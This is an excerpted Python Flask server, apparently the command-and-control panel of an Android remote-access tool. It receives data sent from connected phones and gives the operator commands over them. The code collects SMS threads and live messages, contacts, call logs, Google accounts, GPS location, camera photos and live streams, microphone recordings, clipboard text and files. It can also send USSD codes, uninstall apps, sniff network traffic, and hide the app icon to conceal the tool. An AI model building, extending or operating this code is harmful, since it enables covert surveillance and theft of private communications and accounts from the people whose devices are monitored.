...
# Color codes for text inside brackets and parentheses
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
...
class DeviceMonitorServer:
    def __init__(self, host='0.0.0.0', port=5000):
        ...
        self.UPLOAD_DIR = UPLOAD_DIR  # Use the global UPLOAD_DIR
        ...
        self.permissions_history = {}  # Added for permissions tracking
    ...
    def get_prompt_string(self):
        ...
        if self.selected_device_id and self.selected_device_id in self.current_directory:
            ...
            return f"[{CYAN}{current_dir}{RESET}]> "
        else:
            return f"[{CYAN}no device selected{RESET}]> "
    ...
    def setup_routes(self):
        ...
        def connect_device():
            try:
                ...
                if device_id not in self.permissions_history:
                    self.permissions_history[device_id] = []
        ...
        @self.app.route('/app_visibility', methods=['POST'])
        def receive_app_visibility():
            """Handle app visibility status updates from devices"""
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                ...
                print(f"\n[{GREEN}info{RESET}] APP VISIBILITY STATUS:")
                ...
                return jsonify({
                    'status': 'success',
                    'message': 'App visibility status received'
                })
            except Exception as e:
                print(f"[{RED}error{RESET}] Error receiving app visibility status: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        ...
        def fs_response():
            ...
            try:
                ...
                if command == 'pwd' and success:
                    ...
                    print(f"\n[{YELLOW}folder{RESET}] Current directory on {device_id}: {path}")
                elif command == 'cd' and success:
                    self.current_directory[device_id] = path
                    print(f"\n[{YELLOW}folder{RESET}] Changed directory on {device_id} to: {path}")
                elif command == 'search' and success:
                    results = data.get('results', [])
                    print(f"\n[{YELLOW}search{RESET}] Search results on {device_id} in {self.current_directory[device_id]}:")
                    for result in results:
                        print(f"   - {result}")
                elif command == 'mkdir' and success:
                    print(f"\n[{YELLOW}folder{RESET}] Directory created on {device_id}: {path}")
                elif command == 'ls' and success:
                    items = data.get('items', [])
                    print(f"\n[{YELLOW}folder{RESET}] Directory listing for {device_id} in {path}:")
                    for item in items:
                        item_type = f"[{YELLOW}folder{RESET}]" if item.get('is_directory', False) else "📄"
                    ...
                    print(f"\n[{YELLOW}folder{RESET}] File uploaded from {device_id}: {file_path}")
                elif command == 'download_file' and success:
                    file_path = data.get('file_path', '')
                    print(f"\n[{YELLOW}folder{RESET}] File downloaded to {device_id}: {file_path}")
                elif not success:
                    print(f"\n[{RED}error{RESET}] File system command failed on {device_id}: {error}")
        ...
        @self.app.route('/upload_base64', methods=['POST'])
        def upload_base64():
            try:
                ...
                if not base64_data:
                    return jsonify({'status': 'error', 'message': 'No file data provided'}), 400
                ...
                upload_dir = os.path.join(self.UPLOAD_DIR, device_id)
                if not os.path.exists(upload_dir):
                    os.makedirs(upload_dir)
                ...
                print(f"\n[{GREEN}upload{RESET}] File uploaded:")
                print(f"   Device: {device_id}")
                ...
                print(f"[{RED}error{RESET}] Upload error: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

        @self.app.route('/download_base64', methods=['POST'])
        def download_base64():
            try:
                data = request.get_json()
                device_id = data.get('device_id', request.remote_addr)
                ...
                server_path = os.path.join(self.UPLOAD_DIR, device_id, os.path.basename(file_path))
                ...
                print(f"\n[{BLUE}download{RESET}] File downloaded:")
                print(f"   Device: {device_id}")
                ...
                print(f"[{RED}error{RESET}] Download error: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500
        ...
        def receive_accounts():
            try:
                ...
                if success:
                    ...
                    print(f"\n[{MAGENTA}phone{RESET}] GOOGLE ACCOUNTS RECEIVED:")
                    print(f"   From device: {device_id}")
                    print(f"   Total accounts: {len(accounts)}")
                    for account in accounts:
                        print(f"   - {account}")
                    print("[{GREEN}info{RESET}] Accounts data stored successfully")
                else:
                    print(f"\n[{RED}error{RESET}] Error retrieving accounts from {device_id}: {error}")
                ...
                print(f"[{RED}error{RESET}] Error receiving accounts: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        ...
        def receive_sms():
            try:
                ...
                if self.sms_listening_active:
                    print(f"\n[{MAGENTA}phone{RESET}] NEW SMS RECEIVED:")
                    print(f"   Type: {msg_type.upper()}")
                    print(f"   From: {sender}")
                    print(f"   Message: {message}")
                    print(f"   Time: {time_str}")
                    print("[{GREEN}info{RESET}] Press 'z' to stop listening for SMS messages")
        ...
        def receive_sms_threads():
            try:
                ...
                print(f"\n[{MAGENTA}phone{RESET}] SMS THREADS RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Total threads: {len(threads)}")
                print("[{GREEN}info{RESET}] Threads data stored successfully")
                ...
                print(f"[{RED}error{RESET}] Error receiving SMS threads: {str(e)}")
                import traceback
                traceback.print_exc()
                return jsonify({
                    'status': 'error',
        ...
        def receive_sms_conversation():
            try:
                ...
                print(f"\n[{MAGENTA}phone{RESET}] SMS CONVERSATION RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Sender: {sender}")
                print(f"   Total messages: {len(conversation)}")
                print(f"   Time: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
                print("[{GREEN}info{RESET}] Conversation data stored successfully")
                print("[{GREEN}info{RESET}] Type 'show_conversation <sender>' to display the full conversation")
                ...
                print(f"[{RED}error{RESET}] Error receiving SMS conversation: {str(e)}")
                import traceback
                traceback.print_exc()
                return jsonify({
                    'status': 'error',
        ...
        def receive_ussd_status():
            try:
                ...
                if status == "waiting":
                    print(f"\n[{MAGENTA}phone{RESET}] USSD CODE SENT: {ussd_code}")
                    print("[{YELLOW}wait{RESET}] Waiting for response...")
        ...
        def receive_ussd_response():
            try:
                ...
                print(f"\n[{MAGENTA}phone{RESET}] USSD RESPONSE RECEIVED:")
                print(f"   Code: {ussd_code}")
                print(f"   Response: {response}")
                print("[{GREEN}info{RESET}] Press any key to continue")
        ...
        def receive_app_list():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                app_list = data.get('app_list', [])  # full list now
                ...
                print(f"[✓] Received {len(app_list)} apps from {device_id}")

                return jsonify({'status': 'success', 'count': len(app_list)})
            except Exception as e:
                return jsonify({'status': 'error', 'message': str(e)}), 500
        ...
        def receive_devices():
            try:
                ...
                print(f"\n[{YELLOW}search{RESET}] NETWORK DEVICES RECEIVED:")
                print(f"   From device: {device_id}")
                ...
                print(f"[{RED}error{RESET}] Error receiving devices data: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500
        ...
        def receive_contacts():
            try:
                ...
                print(f"\n[{MAGENTA}phone{RESET}] CONTACTS RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Total contacts: {len(contacts)}")
                print("[{GREEN}info{RESET}] Contacts data stored successfully")
                ...
                print(f"[{RED}error{RESET}] Error receiving contacts: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        ...
        def receive_call_logs():
            try:
                ...
                print(f"\n[{BLUE}call{RESET}] CALL LOGS RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Total call logs: {len(call_logs)}")
                print("[{GREEN}info{RESET}] Call logs data stored successfully")
                ...
                print(f"[{RED}error{RESET}] Error receiving call logs: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        ...
        def receive_location():
            try:
                ...
                print(f"\n[{GREEN}location{RESET}] LOCATION RECEIVED:")
                print(f"   From device: {device_id}")
                if error:
                    print(f"   Error: {error}")
                else:
                ...
                print("[{GREEN}info{RESET}] Location data stored successfully")
                ...
                print(f"[{RED}error{RESET}] Error receiving location: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        ...
        def receive_camera():
            try:
                ...
                if image_file:
                    ...
                    print(f"\n[{CYAN}camera{RESET}] CAMERA IMAGE RECEIVED:")
                    print(f"   Device: {device_id}")
                    print(f"   Filename: {filename}")
                    print(f"   Time: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
                    print("[{GREEN}info{RESET}] Image saved successfully")

                    return jsonify({'status': 'success', 'message': 'Image received'})
                else:
                    return jsonify({'status': 'error', 'message': 'No image file provided'}), 400
            except Exception as e:
                print(f"[{RED}error{RESET}] Error receiving camera image: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500
        ...
        def receive_audio():
            try:
                ...
                if audio_file:
                    ...
                    print(f"\n[{MAGENTA}mic{RESET}] AUDIO RECORDING RECEIVED:")
                    print(f"   Device: {device_id}")
                    print(f"   Filename: {filename}")
                    print(f"   Duration: {duration} seconds")
                    print(f"   Time: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
                    print("[{GREEN}info{RESET}] Audio file saved successfully")

                    return jsonify({'status': 'success', 'message': 'Audio received'})
                else:
                    return jsonify({'status': 'error', 'message': 'No audio file provided'}), 400
            except Exception as e:
                print(f"[{RED}error{RESET}] Error receiving audio: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        ...
        def download_file():
            ...
            try:
                ...
                print(f"\n[{YELLOW}folder{RESET}] FILE DOWNLOADED:")
                print(f"   Device: {device_id}")
                ...
                print(f"[{RED}error{RESET}] Error downloading file: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500
        ...
        def disconnect_device():
            try:
                ...
                if device_id in self.permissions_history:
                    del self.permissions_history[device_id]
        ...
        # Add the new permissions endpoints
        @self.app.route('/permissions', methods=['POST'])
        def receive_permissions():
            """Handle permissions list from devices"""
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                ...
                if success:
                    self.permissions_history[device_id] = permissions
                    print(f"\n[{MAGENTA}shield{RESET}] PERMISSIONS RECEIVED:")
                    print(f"   From device: {device_id}")
                    print(f"   Total permissions: {len(permissions)}")
                    print("[{GREEN}info{RESET}] Permissions data stored successfully")
                else:
                    print(f"\n[{RED}error{RESET}] Error retrieving permissions from {device_id}: {error}")

                return jsonify({
                    'status': 'success',
                    'message': 'Permissions data received'
                })
            except Exception as e:
                print(f"[{RED}error{RESET}] Error receiving permissions: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/permission_request_result', methods=['POST'])
        def receive_permission_request_result():
            """Handle permission request result from devices"""
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                ...
                print(f"\n[{MAGENTA}shield{RESET}] PERMISSION REQUEST RESULT:")
                print(f"   Device: {device_id}")
                ...
                return jsonify({
                    'status': 'success',
                    'message': 'Permission request result received'
                })
            except Exception as e:
                print(f"[{RED}error{RESET}] Error receiving permission request result: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        ...
        def not_found(e):
            return jsonify({
                ...
                'available_endpoints': ['/ping', '/status', '/connect', '/data', '/heartbeat', '/disconnect', '/commands', '/send_command', '/contacts', '/call_logs', '/location', '/camera', '/mic', '/fs_response', '/download_file', '/check_file', '/accounts', '/permissions', '/permission_request_result']
            }), 404
    ...
    def start_stream_viewer(self):
        ...
        if self.stream_process is None or not self.stream_process.is_alive():
            ...
            print("[{CYAN}stream{RESET}] Stream viewer started on port 5001")
    ...
    def process_command_mode_input(self, user_input):
        ...
        if user_input.lower() == 'permissions':
            ...
            print("[{MAGENTA}shield{RESET}] Retrieving permissions from all devices...")
            self.display_permissions_results()
            return

        if user_input.lower().startswith('request '):
            permission_name = user_input[8:].strip()
            if not permission_name:
                print("[{RED}error{RESET}] Please specify a permission name")
                return
            ...
            print(f"[{MAGENTA}shield{RESET}] Requesting permission: {permission_name}")
            return

        if not self.connected_devices:
            print("[{RED}error{RESET}] No devices connected. Cannot send commands.")
            return
        ...
        if command == 'cb':
            if not param:
                ...
                print("[{MAGENTA}clipboard{RESET}] Clipboard retrieval command sent to all devices")
            else:
                for device_id in self.connected_devices.keys():
                    self.device_commands[device_id].append({
                ...
                print(f"[{MAGENTA}clipboard{RESET}] Clipboard set to '{param}' on all devices")
            ...
            print(f"[{RED}fire{RESET}] Vibrate command sent to {len(self.connected_devices)} device(s)!")
            ...
            try:
                ...
                print(f"[{BLUE}volume{RESET}] Volume {'increased' if change_type == '+' else 'decreased'} by {change_value} on all devices")
            except (ValueError, IndexError):
                print("[{RED}error{RESET}] Invalid volume command. Use format: volume+10 or volume-10")
            ...
            try:
                ...
                print(f"[{GREEN}info{RESET}] Brightness {'increased' if change_type == '+' else 'decreased'} by {change_value} on all devices")
            except (ValueError, IndexError):
                print("[{RED}error{RESET}] Invalid brightness command. Use format: bright+10 or bright-10")
            ...
            print("[{YELLOW}wait{RESET}] Retrieving system information...")
            ...
            print("[{YELLOW}wait{RESET}] Scanning network...")
            ...
            print("[{YELLOW}wait{RESET}] Scanning for Bluetooth devices...")
            ...
            print("[{MAGENTA}phone{RESET}] Retrieving Google accounts from all devices...")
            ...
            print("[{BLUE}volume{RESET}] Ring command sent to all devices")

        elif command.startswith('open'):
            url = user_input[5:].strip()
            if not url:
                print("[{RED}error{RESET}] No URL provided. Usage: open [url]")
                return
            ...
            if '.' not in url and not url.startswith(('http://localhost', 'https://localhost')):
                print("[{RED}error{RESET}] Invalid URL format. Please include a domain name.")
                return
            ...
            print(f"[{GREEN}globe{RESET}] Open URL command sent: {url}")
            ...
            print("[{YELLOW}wait{RESET}] Retrieving app list from all devices...")
            ...
            if not app_name_or_package:
                print("[{RED}error{RESET}] Please specify an app name or package name")
                return
            ...
            print(f"[{GREEN}rocket{RESET}] Launch command sent for: {app_name_or_package}")
            ...
            print(f"[{RED}trash{RESET}] Uninstall command sent for: {app_name_or_package}")
            ...
            if not sender:
                print("[{RED}error{RESET}] Please specify a sender name")
                return
            ...
            if full_conversation:
                print(f"[{MAGENTA}phone{RESET}] Reading FULL SMS conversation with: {sender}")
            else:
                print(f"[{MAGENTA}phone{RESET}] Reading SMS conversation with: {sender} (limited)")
            print("[{YELLOW}wait{RESET}] Waiting for response from device...")
            ...
            print("[{YELLOW}wait{RESET}] Retrieving SMS threads from all devices...")
            ...
            try:
                ...
                print(f"[{MAGENTA}phone{RESET}] Reading SMS thread with ID: {thread_id}")
                print("[{YELLOW}wait{RESET}] Waiting for response from device...")
            except (ValueError, IndexError):
                print("[{RED}error{RESET}] Invalid thread ID. Use format: read_thread [thread_id]")

        elif command.startswith('show_conversation'):
            parts = user_input.split(maxsplit=1)
            if len(parts) < 2:
                print("[{RED}error{RESET}] Please specify a sender name")
                print("[{GREEN}info{RESET}] Available senders:")
            ...
            if not found:
                print(f"[{RED}error{RESET}] No conversation found for sender: {sender}")
                print("[{GREEN}info{RESET}] Available senders:")
                for device_id, conversations in self.sms_conversations.items():
                    for stored_sender in conversations.keys():
                        print(f"   - {stored_sender}")
            ...
            print("[{YELLOW}wait{RESET}] Retrieving device status...")

        elif command.startswith('sniff'):
            try:
                duration = int(command[5:])
                if duration <= 0 or duration > 300:
                    print("[{RED}error{RESET}] Duration must be between 1 and 300 seconds")
                    return
                ...
                print(f"[{YELLOW}search{RESET}] Network sniffing started for {duration} seconds on all devices")
            except (ValueError, IndexError):
                print("[{RED}error{RESET}] Invalid sniff command. Use format: sniff<duration> (e.g., sniff30)")
            ...
            print("[{YELLOW}search{RESET}] Scanning for devices on the current network...")
        ...
        # Add these cases to the process_command_mode_input method
            ...
            print("[{MAGENTA}phone{RESET}] Retrieving contacts from all devices...")
            ...
            print("[{BLUE}call{RESET}] Retrieving call logs from all devices...")
            ...
            print("[{GREEN}location{RESET}] Retrieving location from all devices...")
            ...
            if camera_type not in ["front", "back"]:
                print("[{RED}error{RESET}] Invalid camera type. Use 'front' or 'back'")
                return
            ...
            print(f"[{CYAN}camera{RESET}] Taking {camera_type} camera image on all devices...")

        elif command.startswith('mic'):
            try:
                duration = int(user_input[4:].strip()) if len(user_input) > 4 else 10
                if duration <= 0 or duration > 60:
                    print("[{RED}error{RESET}] Duration must be between 1 and 60 seconds")
                    return
                ...
                print(f"[{MAGENTA}mic{RESET}] Recording audio for {duration} seconds on all devices...")
            except (ValueError, IndexError):
                print("[{RED}error{RESET}] Invalid mic command. Use format: mic<duration> (e.g., mic10)")
            ...
            print(f"[{CYAN}stream{RESET}] Starting live stream with {camera_type} camera...")
            self.start_stream_viewer()
            ...
            print("[{CYAN}stream{RESET}] Stopping live stream...")
            if self.stream_process and self.stream_process.is_alive():
                self.stream_process.terminate()
                self.stream_process = None

        # New hide and unhide commands
        elif command == 'hide':
            for device_id in self.connected_devices.keys():
                self.device_commands[device_id].append({
                    'command': 'hide',
            ...
            print("[{GREEN}info{RESET}] Hide command sent to all devices")
            ...
            print("[{GREEN}info{RESET}] Unhide command sent to all devices")

        elif command == 'help' or command == 'h':
            self.show_command_help()

        elif command == 'quit' or command == 'q':
            print(f"\n[{RED}stop{RESET}] Shutting down server...")
            self.stop()
            ...
            print("[{RED}error{RESET}] Unknown command. Type 'help' for available commands.")
            self.show_prompt()
    ...
    def handle_pwd_command(self):
        ...
        if not self.selected_device_id:
            print("[{RED}error{RESET}] No device selected. Use 'select_device [device_id]' first.")
            self.show_prompt()
            return

        if self.selected_device_id not in self.connected_devices:
            print(f"[{RED}error{RESET}] Device {self.selected_device_id} is not connected.")
            self.show_prompt()
            return
        ...
        print(f"[{YELLOW}folder{RESET}] Requesting current directory from device {self.selected_device_id}...")
    ...
    def handle_cd_command(self, path):
        ...
        print(f"[{YELLOW}folder{RESET}] Changing directory to '{path}' on device {self.selected_device_id}...")
    ...
    def handle_search_command(self, query):
        ...
        print(f"[{YELLOW}search{RESET}] Searching for '{query}' in {current_dir} on device {self.selected_device_id}...")
    ...
    def handle_mkdir_command(self, dirname):
        ...
        print(f"[{YELLOW}folder{RESET}] Creating directory '{dirname}' in {current_dir} on device {self.selected_device_id}...")
    ...
    def handle_ls_command(self, path):
        ...
        print(f"[{YELLOW}folder{RESET}] Listing directory contents of {target_path} on device {self.selected_device_id}...")
    ...
    def handle_upload_file_command(self, file_path):
        ...
        print(f"[{YELLOW}folder{RESET}] Uploading file {file_path} from device {self.selected_device_id}...")
    ...
    def handle_download_file_command(self, file_path):
        ...
        print(f"[{YELLOW}folder{RESET}] Downloading file {file_path} to device {self.selected_device_id}...")
    ...
    def handle_select_device_command(self, device_id_pattern):
        ...
        if not matching_devices:
            print("[{RED}error{RESET}] No devices found matching that pattern")
            self.show_prompt()
            return

        if len(matching_devices) > 1:
            print("[{RED}error{RESET}] Multiple devices found. Please be more specific:")
        ...
        print(f"[{GREEN}ok{RESET}] Selected device: {self.selected_device_id}")
        self.show_prompt()

    def handle_deselect_device_command(self):
        """Handle the deselect_device command"""
        if self.selected_device_id is None:
            print("[{RED}error{RESET}] No device currently selected")
            self.show_prompt()
            return

        print(f"[{GREEN}ok{RESET}] Deselected device: {self.selected_device_id}")
        self.selected_device_id = None
        self.show_prompt()
    ...
    def handle_list_devices_command(self):
        ...
        if not self.connected_devices:
            print("[{RED}error{RESET}] No devices connected")
            self.show_prompt()
            return

        print("\n[{MAGENTA}phone{RESET}] Connected Devices:")
        print("-" * 60)
        for device_id, device_info in self.connected_devices.items():
            ...
            status = "[{GREEN}Active{RESET}]" if time_since_last < 10 else "[{YELLOW}Idle{RESET}]" if time_since_last < 30 else "[{RED}Stale{RESET}]"
    ...
    def display_accounts_results(self):
        ...
        print("\n" + "=" * 80)
        print("[{MAGENTA}phone{RESET}] GOOGLE ACCOUNTS")
        print("=" * 80)

        if not any(self.accounts_history.values()):
            print("[{RED}error{RESET}] No accounts received from devices.")
            return
        ...
        for device_id, accounts in self.accounts_history.items():
            ...
            print(f"\n[{MAGENTA}phone{RESET}] Device: {device_id}")
            print("-" * 80)
    ...
    def display_sms_conversation(self, sender, conversation):
        print("\n" + "=" * 80)
        print(f"[{MAGENTA}phone{RESET}] SMS CONVERSATION WITH: {sender.upper()}")
        print("=" * 80)

        if not conversation:
            print("[{RED}error{RESET}] No messages found in conversation")
            return
        ...
        for msg in conversation:
            ...
            if msg_type == 'incoming':
                print(f"[{GREEN}in{RESET}] FROM {sender_name} at {time_str}:")
            else:
                print(f"[{BLUE}out{RESET}] TO {sender_name} at {time_str}:")
    ...
    def display_sms_threads_results(self):
        ...
        print("\n" + "=" * 80)
        print("[{MAGENTA}phone{RESET}] SMS THREADS")
        print("=" * 80)

        if not any(self.sms_threads.values()):
            print("[{RED}error{RESET}] No SMS threads received from devices.")
            return
    ...
    def enter_ussd_mode(self):
        print("\n" + "=" * 60)
        print("[{MAGENTA}phone{RESET}] USSD MODE")
        print("=" * 60)
        print("[{GREEN}info{RESET}] Enter USSD code to send to device (e.g., *123#)")
        print("[{GREEN}info{RESET}] Type 'exit' to return to command mode")
        print("[{GREEN}info{RESET}] Type 'help' for USSD mode commands")
        print("=" * 60)
        ...
        while self.mode == "ussd":
            try:
                ...
                if user_input.lower() == 'help':
                    print("\n[{MAGENTA}clipboard{RESET}] USSD Mode Commands:")
                ...
                if not user_input.startswith('*') or not user_input.endswith('#'):
                    print("[{RED}error{RESET}] Invalid USSD code format. Must start with * and end with #")
                    continue
                ...
                print(f"[{MAGENTA}phone{RESET}] USSD code '{user_input}' sent to all devices")
                print("[{YELLOW}wait{RESET}] Waiting for response...")
                ...
                print(f"[{RED}error{RESET}] Error: {e}")

    def enter_sms_mode(self):
        print("\n" + "=" * 60)
        print("[{MAGENTA}phone{RESET}] SMS LISTENING MODE")
        print("=" * 60)
        print("[{GREEN}info{RESET}] Listening for incoming and outgoing SMS messages...")
        print("[{GREEN}info{RESET}] Press 'z' to stop listening and return to command mode")
        print("[{GREEN}info{RESET}] Type 'help' for SMS mode commands")
        print("=" * 60)
        ...
        while self.mode == "sms":
            try:
                if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                    ...
                    if user_input.lower() == 'help':
                        print("\n[{MAGENTA}clipboard{RESET}] SMS Mode Commands:")
    ...
    def display_sysinfo_results(self):
        ...
        print("\n" + "=" * 60)
        print("[{MAGENTA}phone{RESET}] SYSTEM INFORMATION")
        print("=" * 60)

        if not any(self.device_data.values()):
            print("[{RED}error{RESET}] No system information received from devices.")
            return
        ...
        for device_id, device_info in self.device_data.items():
            ...
            print("\n[{CYAN}stream{RESET}] SCREEN INFORMATION:")
            ...
            print("\n[{GREEN}save{RESET}] MEMORY INFORMATION:")
            ...
            print("\n[{BLUE}disk{RESET}] STORAGE INFORMATION:")
            ...
            print("\n[{YELLOW}battery{RESET}] BATTERY INFORMATION:")
    ...
    def display_netinfo_results(self):
        ...
        print("\n" + "=" * 60)
        print("[{GREEN}globe{RESET}] NETWORK INFORMATION")
        print("=" * 60)

        if not any(self.device_data.values()):
            print("[{RED}error{RESET}] No network information received from devices.")
            return
        ...
        for device_id, device_info in self.device_data.items():
            ...
            print("[{GREEN}link{RESET}] CONNECTION INFORMATION:")
            ...
            print("\n[{BLUE}wifi{RESET}] WIFI INFORMATION:")
            ...
            print("\n[{MAGENTA}phone{RESET}] CELLULAR INFORMATION:")
            for key in cellular_info:
                if key in device_info['data']:
                    display_key = key.replace('_', ' ').title()
                    print(f"  {display_key}: {device_info['data'][key]}")

            print("\n[{GREEN}globe{RESET}] AVAILABLE WIFI NETWORKS:")
            ...
            print("\n[{BLUE}blue{RESET}] BLUETOOTH DEVICES:")
    ...
    def display_bluetooth_results(self):
        ...
        print("\n" + "=" * 60)
        print("[{BLUE}blue{RESET}] BLUETOOTH SCAN RESULTS")
        print("=" * 60)

        if not any(self.device_data.values()):
            print("[{RED}error{RESET}] No Bluetooth information received from devices.")
            return
        ...
        for device_id, device_info in self.device_data.items():
            ...
            print(f"[{BLUE}blue{RESET}] Bluetooth Status: {bt_status}")

            bt_count = device_info['data'].get('bluetooth_devices_count', 0)
            print(f"\n[{YELLOW}search{RESET}] Total Bluetooth Devices Found: {bt_count}")
            ...
            if bt_count > 0:
                ...
                print("  [{RED}error{RESET}] No Bluetooth devices found.")
    ...
    def display_app_list_results(self):
        ...
        print("\n" + "=" * 80)
        print("[{MAGENTA}phone{RESET}] INSTALLED APPLICATIONS")
        print("=" * 80)

        if not any(self.app_lists.values()):
            print("[{RED}error{RESET}] No app list received from devices.")
            return
    ...
    def display_contacts_results(self):
        ...
        print("\n" + "=" *80)
        print("[{MAGENTA}phone{RESET}] CONTACTS")
        print("=" * 80)

        if not any(self.contacts_history.values()):
            print("[{RED}error{RESET}] No contacts received from devices.")
            return
    ...
    def display_call_logs_results(self):
        ...
        print("\n" + "=" * 80)
        print("[{BLUE}call{RESET}] CALL LOGS")
        print("=" * 80)

        if not any(self.call_logs_history.values()):
            print("[{RED}error{RESET}] No call logs received from devices.")
            return
    ...
    def display_location_results(self):
        ...
        print("\n" + "=" * 80)
        print("[{GREEN}location{RESET}] LOCATION DATA")
        print("=" * 80)

        if not any(self.location_history.values()):
            print("[{RED}error{RESET}] No location data received from devices.")
            return
        ...
        for device_id, locations in self.location_history.items():
            ...
            for location in locations:
                if 'error' in location:
                    print(f"[{RED}error{RESET}] Error: {location['error']}")
                else:
                    print(f"[{GREEN}location{RESET}] Latitude: {location.get('latitude', 'N/A')}")
                    print(f"[{GREEN}location{RESET}] Longitude: {location.get('longitude', 'N/A')}")
                    print(f"[{YELLOW}target{RESET}] Accuracy: {location.get('accuracy', 'N/A')} meters")
                    print(f"[{BLUE}mountain{RESET}] Altitude: {location.get('altitude', 'N/A')} meters")
                    print(f"[{GREEN}rocket{RESET}] Speed: {location.get('speed', 'N/A')} m/s")
                    print(f"[{BLUE}compass{RESET}] Bearing: {location.get('bearing', 'N/A')} degrees")
                    print(f"[{YELLOW}clock{RESET}] Time: {location.get('time_str', 'N/A')}")
                print()
    ...
    def display_camera_results(self):
        ...
        print("\n" + "=" * 80)
        print("[{CYAN}camera{RESET}] CAMERA IMAGES")
        print("=" * 80)

        if not any(self.camera_history.values()):
            print("[{RED}error{RESET}] No camera images received from devices.")
            return
        ...
        for device_id, images in self.camera_history.items():
            ...
            for image in images:
                print(f"[{CYAN}camera{RESET}] Filename: {image.get('filename', 'N/A')}")
                print(f"[{YELLOW}clock{RESET}] Time: {image.get('time_str', 'N/A')}")
                print()
    ...
    def display_audio_results(self):
        ...
        print("\n" + "=" * 80)
        print("[{MAGENTA}mic{RESET}] AUDIO RECORDINGS")
        print("=" * 80)

        if not any(self.audio_history.values()):
            print("[{RED}error{RESET}] No audio recordings received from devices.")
            return
        ...
        for device_id, recordings in self.audio_history.items():
            ...
            for recording in recordings:
                print(f"[{MAGENTA}mic{RESET}] Filename: {recording.get('filename', 'N/A')}")
                print(f"[{YELLOW}timer{RESET}] Duration: {recording.get('duration', 'N/A')} seconds")
                print(f"[{YELLOW}clock{RESET}] Time: {recording.get('time_str', 'N/A')}")
                print()

        print("=" * 80)
        self.show_prompt()

    def display_permissions_results(self):
        timeout = 10
        start_time = time.time()

        while time.time() - start_time < timeout:
            if any(self.permissions_history.values()):
                break
            time.sleep(0.5)

        print("\n" + "=" * 80)
        print("[{MAGENTA}shield{RESET}] APP PERMISSIONS")
        print("=" * 80)

        if not any(self.permissions_history.values()):
            print("[{RED}error{RESET}] No permissions received from devices.")
            return

        for device_id, permissions in self.permissions_history.items():
            if device_id not in self.connected_devices:
                continue

            print(f"\n[{MAGENTA}shield{RESET}] Device: {device_id}")
            print("-" * 80)

            print(f"   Total Permissions: {len(permissions)}")
            print()

            print(f"{'Permission Name':<50} {'Status':<10} {'Protection Level':<20}")
            print("-" * 90)
            ...
            for perm in permissions:
                ...
                print(f"{name:<50} {status:<10} {protection_level:<20}")
    ...
    def show_command_help(self):
        print("\n" + "="*60)
        print("                    CONTROL CENTER COMMANDS")
        print("="*60)

    # DEVICE & SYSTEM
        print("\n[DEVICE & SYSTEM]")
        print("  devices                        List all devices on network")
        print("  select_device [device_id]      Select a device for operations")
        print("  deselect_device                Deselect current device")
        print("  get_status                     Show device status")
        print("  sysinfo                        System information")
        print("  netinfo                        Network info scan")
        print("  bluetooth                      Bluetooth scan only")

    # FILES & DIRECTORIES
        print("\n[FILES & DIRECTORIES]")
        print("  pwd                            Show current directory on device")
        print("  cd [path]                      Change directory")
        print("  ls [path]                      List files")
        print("  search [query]                 Search files")
        print("  mkdir [name]                   Create directory")
        print("  upload_file [path]             Upload file to server")
        print("  download_file [path]           Download file to device")

    # CLIPBOARD
        print("\n[CLIPBOARD]")
        print("  cb                             Get clipboard text from all devices")
        print("  cb [text]                      Set clipboard text")

    # SMS & CALL LOGS
        print("\n[SMS & CALL LOGS]")
        print("  listen-sms                     Start live SMS listener")
        print("  read_sms [sender] [-w]         Read SMS conversation")
        print("  get_threads                    List SMS threads")
        print("  read_thread [id]               Read specific SMS thread")
        print("  show_conversation [sender]     Print stored conversation")
        print("  get_call_logs                  Get call logs")
        print("  get_all_contacts               Get contacts")

    # TELEPHONY & USSD
        print("\n[TELEPHONY]")
        print("  ussd                           Enter USSD mode for sending codes")

    # VOLUME & BRIGHTNESS
        print("\n[VOLUME & BRIGHTNESS]")
        print("  w                              Vibrate device(s)")
        print("  volume+[num]                   Increase volume")
        print("  volume-[num]                   Decrease volume")
        print("  bright+[num]                   Increase brightness")
        print("  bright-[num]                   Decrease brightness")

    # CAMERA, AUDIO, STREAM
        print("\n[CAMERA, AUDIO, STREAM]")
        print("  camera [front/back]            Take picture")
        print("  mic<num>                       Record mic audio (example: mic10)")
        print("  stream                         Start live camera stream")
        print("  stop_stream                    Stop stream")
        print("  start_stream_viewer            Start stream viewer (port 5001)")

    # APPLICATIONS
        print("\n[APPLICATIONS]")
        print("  app_list                       List installed apps")
        print("  launch [app]                   Launch app by name or package")
        print("  uninstall [app]                Uninstall app by name or package")
        print("  hide                           Hide app icon")
        print("  unhide                         Show app icon")

    # INTERNET & WEB
        print("\n[WEB COMMANDS]")
        print("  open [url]                     Open a URL on device browser")

    # LOCATION
        print("\n[LOCATION]")
